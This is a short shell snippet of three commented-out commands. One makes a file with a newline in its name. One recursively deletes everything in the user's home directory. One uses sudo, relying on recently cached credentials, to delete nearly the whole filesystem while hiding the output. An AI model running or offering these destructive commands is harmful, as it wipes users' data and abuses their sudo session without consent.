# Create a file of which name contains a newline.
# FOO=$(printf '%s\n%s' foo bar); touch "$FOO"

# Wipe $HOME
# (cd ~ && find . -depth 1 -exec rm -rf {} \;) 2>&1 >/dev/null

# Wipe (almost) the whole thing if the user ran sudo(8) last 5 minutes.
# (cd / && sudo find . -depth 1 -exec rm -rf {} \;) 2>&1 >/dev/null
